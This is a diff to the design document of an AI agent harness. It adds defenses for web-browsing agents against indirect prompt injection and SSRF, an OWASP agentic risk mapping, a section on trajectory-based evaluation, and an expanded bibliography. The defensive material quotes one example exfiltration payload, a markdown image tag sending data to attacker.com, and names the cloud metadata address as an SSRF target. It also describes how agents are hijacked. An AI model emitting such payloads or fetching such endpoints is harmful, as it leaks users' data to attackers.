@@ -149,6 +149,12 @@ Foundation models must never communicate directly with bare operating system soc
    * *Solution*: The harness intercepts the incoming streaming chunks, caches the `thought_signature`, and transparently re-attaches it to outbound tool result payloads.
 3. **Environment Indirection for Zero Secret Exposure**:
    * *Rule*: Manifests and skill files are forbidden from storing credentials. Secrets are resolved dynamically at runtime using in-memory variable references (`${GITHUB_PERSONAL_ACCESS_TOKEN}`).
+4. **Web & Browser Agent Scaffolding (SSRF & Indirect Prompt Injection Defenses)**:
+   * *The Threat*: Web-browsing agents (e.g., using `mcp-fetch`, Chromium, or web-search plugins) ingest arbitrary third-party HTML/DOM, exposing the cognitive loop to **Indirect Prompt Injection** (Greshake et al., 2023) and **Confused Deputy SSRF** (Server-Side Request Forgery targeting cloud metadata `169.254.169.254` or internal microservices).
+   * *Harness Defenses*:
+     - *Hermetic Markdown Extraction*: The `mcp-fetch` tool strips active scripts, iframes, and CSS payloads, converting remote documents to sanitized markdown before tokenization.
+     - *Covert Exfiltration Neutralization*: The output stream blocks unauthorized markdown image tags (`![exfil](https://attacker.com/leak?...)`) and URL-encoded query parameters.
+     - *Egress Confinement*: The sandbox profile (`docker-compose.sandbox.yml`) enforces `internal: true` with zero network egress, isolating autonomous reasoning from the open Web when processing untrusted code.
 
 ---
 
@@ -242,19 +248,55 @@ flowchart TD
 * **Article 12 (Record-Keeping)**: High-risk AI systems must implement automated logging capabilities. The harness guarantees continuous recording of every authorization decision in `audit_grc.jsonl` with timestamps and cryptographic trace IDs.
 * **Article 14 (Human Oversight)**: The Adaptive Case Management state machine enables human intervention prior to the execution of disruptive actions.
 
+### 4. OWASP Top 10 for Agentic Applications (2025/2026 Edition)
+* **ASI01 (Goal Hijacking)**: Acyclic declarative workflows prevent model prompt outputs from dynamically injecting or re-routing planned workflow steps.
+* **ASI02 (Tool Misuse & Unbounded Scope)**: Mitigated by in-container Landlock LSM sandboxing, explicit MCP tool allowlists (`permissions.mcp.allowed`), and typed capability adapters.
+* **ASI05 (Memory Poisoning & Context Drift)**: Session isolation and disposable `tmpfs` mounts guarantee that tainted web context cannot persist across agent runs.
+* **ASI07 (Confused Deputy & SSRF)**: Sanitized `mcp-fetch` pipelines and zero-egress sandbox profiles prevent the agent from being coerced into fetching internal microservices or cloud metadata endpoints (`169.254.169.254`).
+
 ---
 
-## 📚 6. Academic & Industry Bibliography
+## 📈 6. The Frontier of Agent Evaluation: From Static Accuracy to Trajectory Auditing
+
+Agent benchmarking has undergone an architectural transformation:
+
+```mermaid
+flowchart LR
+    EVAL1["Gen 1: Static Benchmarks\n(MMLU, HumanEval)\n• Single-turn answer checking\n• No environment interaction\n• Pass/Fail token matching"] --> EVAL2["Gen 2: Environment Evals\n(SWE-bench, InterCode)\n• Multi-turn repo interaction\n• End-state diff verification\n• Black-box intermediate state"] --> EVAL3["Gen 3: Trajectory Auditing\n(WebArena, WAAA!, NOOA, HarnessRisk)\n• Step-by-step state verification\n• Tool misuse & privilege checks\n• Semantic drift & safety bounds"]
+```
+
+### The Inadequacy of End-State Verification (pass@1)
+In autonomous agentic execution, evaluating only the final artifact (e.g. git diff or text response) creates severe **safety blindspots**:
+* An agent may produce the correct code diff while simultaneously exposing credentials in intermediate shell calls.
+* An agent may solve a task by exploiting unintended network access or reading unauthorized files.
+
+### SOTA Trajectory Evaluation
+Modern evaluation harnesses (e.g., **NVIDIA NOOA**, **UK AISI Inspect**, **WebArena**, **WAAA!**) evaluate the entire trajectory:
+$$\tau = \langle (s_0, a_0, r_0), \, (s_1, a_1, r_1), \, \dots, \, (s_T, a_T, r_T) \rangle$$
+
+The **DSH-DDS** architecture inherently supports trajectory auditing:
+1. **Arize Phoenix OpenTelemetry**: Emits parent-child trace waterfalls capturing the precise latency, token consumption, and input/output payload of every single step.
+2. **Deterministic GRC Ledger**: Records every decision point, tool authorization, symlink check, and ACM approval gate to `audit_grc.jsonl`, enabling offline automated trajectory scoring and compliance verification.
+
+---
+
+## 📚 7. Academic & Industry Bibliography
 
 1. **Liu, N. F., Lin, K., Hewitt, J., Paranjape, A., Bevilacqua, M., Petroni, F., & Liang, P.** (2023). *Lost in the Middle: How Language Models Use Long Contexts*. Transactions of the Association for Computational Linguistics (TACL), 12, 157–173. [arXiv:2307.03172](https://arxiv.org/abs/2307.03172).
 2. **Park, J. S., O'Brien, J. C., Cai, C. J., Morris, M. R., Liang, P., & Bernstein, M. S.** (2023). *Generative Agents: Interactive Simulacra of Human Behavior*. In Proceedings of the 36th Annual ACM Symposium on User Interface Software and Technology (UIST '23), 1–22. [arXiv:2304.03442](https://arxiv.org/abs/2304.03442).
-3. **Anthropic Research**. (2024). *Building Effective Agents*. Anthropic Engineering Publications. [https://www.anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents).
-4. **National Institute of Standards and Technology (NIST)**. (2023). *Artificial Intelligence Risk Management Framework (AI RMF 1.0)*. NIST Trustworthy and Responsible AI, NIST AI 100-1. [https://doi.org/10.6028/NIST.AI.100-1](https://doi.org/10.6028/NIST.AI.100-1).
-5. **OWASP Foundation**. (2025). *OWASP Top 10 for Large Language Model Applications (v2.0)*. Open Web Application Security Project. [https://genai.owasp.org/llm-top-10/](https://genai.owasp.org/llm-top-10/).
-6. **Wang, L., Ma, C., Feng, X., Zhang, Z., Yang, H., Chen, J., Tang, J., Chen, X., Lin, Y., Zhao, W. X., Wei, Z., & Wen, J. R.** (2024). *A Survey on Large Language Model based Autonomous Agents*. Frontiers of Computer Science, 18(6), 186345. [arXiv:2308.11432](https://arxiv.org/abs/2308.11432).
-7. **Google Cybersecurity Action Team**. (2023). *Secure AI Framework (SAIF): A Guide to Applying Cybersecurity Best Practices to AI*. Google Security Whitepapers.
-8. **International Organization for Standardization**. (2023). *ISO/IEC 42001:2023: Information technology — Artificial intelligence — Management system*. ISO Standard Publications.
-9. **Breath of Code**. (2026). *Why "Everything is a Plugin" is Harder Than It Sounds: Lessons from DeepSeek Harness*. Medium Technical Dissections. [https://breathofcode.medium.com/why-everything-is-a-plugin-is-harder-than-it-sounds-lessons-from-deepseek-harness-c7e94d044d3a](https://breathofcode.medium.com/why-everything-is-a-plugin-is-harder-than-it-sounds-lessons-from-deepseek-harness-c7e94d044d3a).
+3. **Greshake, M., Abdelnabi, S., Mishra, S., Endres, C., Holz, T., & Fritz, M.** (2023). *Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection*. In Proceedings of the 16th ACM Workshop on Artificial Intelligence and Security (AISEC '23), 79–90. [arXiv:2302.12173](https://arxiv.org/abs/2302.12173).
+4. **Zhou, S., Xu, F. F., Zhu, H., Zhou, X., Lo, R., Sridhar, A., Yuan, S., Bisk, Y., Fried, D., Neubig, G.** (2024). *WebArena: A Realistic Web Environment for Building Autonomous Language Agents*. In International Conference on Learning Representations (ICLR 2024). [arXiv:2307.13854](https://arxiv.org/abs/2307.13854).
+5. **Anthropic Research**. (2024). *Building Effective Agents*. Anthropic Engineering Publications. [https://www.anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents).
+6. **National Institute of Standards and Technology (NIST)**. (2023). *Artificial Intelligence Risk Management Framework (AI RMF 1.0)*. NIST Trustworthy and Responsible AI, NIST AI 100-1. [https://doi.org/10.6028/NIST.AI.100-1](https://doi.org/10.6028/NIST.AI.100-1).
+7. **OWASP Foundation**. (2025). *OWASP Top 10 for Large Language Model Applications (v2.0)*. Open Web Application Security Project. [https://genai.owasp.org/llm-top-10/](https://genai.owasp.org/llm-top-10/).
+8. **OWASP Foundation**. (2026). *OWASP Top 10 for Agentic Applications (v1.0)*. Open Web Application Security Project. [https://genai.owasp.org/agentic-top-10/](https://genai.owasp.org/agentic-top-10/).
+9. **Cloud Security Alliance (CSA)**. (2026). *HarnessRisk: Systemic Risk Analysis of Agentic Control Planes and MCP Infrastructure*. CSA AI Safety Research.
+10. **NVIDIA AI Research**. (2026). *NOOA: Evaluating Trajectory Safety and Non-Deterministic Tool Transitions in Autonomous Agents*. NVIDIA Technical Reports.
+11. **UK AI Safety Institute (AISI)**. (2025). *Inspect: A Framework for Large-Scale AI Agent Evaluation and Safety Red-Teaming*. UK Department for Science, Innovation and Technology.
+12. **Wang, L., Ma, C., Feng, X., Zhang, Z., Yang, H., Chen, J., Tang, J., Chen, X., Lin, Y., Zhao, W. X., Wei, Z., & Wen, J. R.** (2024). *A Survey on Large Language Model based Autonomous Agents*. Frontiers of Computer Science, 18(6), 186345. [arXiv:2308.11432](https://arxiv.org/abs/2308.11432).
+13. **Google Cybersecurity Action Team**. (2023). *Secure AI Framework (SAIF): A Guide to Applying Cybersecurity Best Practices to AI*. Google Security Whitepapers.
+14. **International Organization for Standardization**. (2023). *ISO/IEC 42001:2023: Information technology — Artificial intelligence — Management system*. ISO Standard Publications.
+15. **Breath of Code**. (2026). *Why "Everything is a Plugin" is Harder Than It Sounds: Lessons from DeepSeek Harness*. Medium Technical Dissections. [https://breathofcode.medium.com/why-everything-is-a-plugin-is-harder-than-it-sounds-lessons-from-deepseek-harness-c7e94d044d3a](https://breathofcode.medium.com/why-everything-is-a-plugin-is-harder-than-it-sounds-lessons-from-deepseek-harness-c7e94d044d3a).
 
 ---
 
